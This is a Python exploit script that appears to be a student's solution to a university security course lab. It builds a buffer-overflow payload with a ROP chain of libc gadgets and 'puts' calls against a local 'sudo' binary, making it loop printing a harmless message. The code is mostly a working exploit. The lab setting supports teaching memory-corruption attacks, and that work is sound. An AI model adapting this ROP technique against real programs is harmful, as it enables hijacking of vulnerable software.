import os
import sys
import base64

import addresses
from infosec.core import assemble
from search import GadgetSearch


PATH_TO_SUDO = './sudo'
LIBC_DUMP_PATH = './libc.bin'
ID="325551448"

POP_EBP = "pop ebp"
POP_ESI = "pop esi"
POP_ESP = "pop esp"


def get_string(student_id):
    return 'Take me (%s) to your leader!' % student_id


def get_arg() -> bytes:
    """
    This function returns the (pre-encoded) `password` argument to be sent to
    the `sudo` program.

    This data should cause the program to execute our ROP-chain for printing our
    message in an endless loop. Make sure to return a `bytes` object and not an
    `str` object.

    NOTES:
    1. Use `addresses.PUTS` to get the address of the `puts` function.
    2. Don't write addresses of gadgets directly - use the search object to
       find the address of the gadget dynamically.

    WARNINGS:
    0. Don't delete this function or change it's name/parameters - we are going
       to test it directly in our tests, without running the main() function
       below.

    Returns:
         The bytes of the password argument.
    """
    message = get_string(ID)
    search = GadgetSearch(LIBC_DUMP_PATH)
    # padding then assign ebp to the address of puts so that
    # inside the function it will rewrite the address in the stack
    # in the overwriting and adds the address for puts and the 
    # advance esp and the message and the repeat esp
    rop_chain = []
    rop_chain.append(search.find(POP_EBP))
    rop_chain.append(addresses.PUTS)
    rop_chain.append(addresses.PUTS)
    rop_chain.append(search.find(POP_ESI))
    rop_chain.append(addresses.MESSAGE_ADDR)
    rop_chain.append(search.find(POP_ESP))
    rop_chain.append(addresses.REPEATED_ROP_CHAIN_ADDR)
    encoded_payload = ("A" * (0x8E - 11) + "B" * 4).encode('latin1')
    for rop_chain_part in rop_chain:
        encoded_payload += addresses.address_to_bytes(rop_chain_part)
    encoded_payload += message.encode('latin1')
    return encoded_payload

def main(argv):
    # WARNING: DON'T EDIT THIS FUNCTION!
    # NOTE: os.execl() accepts `bytes` as well as `str`, so we will use `bytes`.
    os.execl(PATH_TO_SUDO, PATH_TO_SUDO, base64.b64encode(get_arg()))


if __name__ == '__main__':
    main(sys.argv)
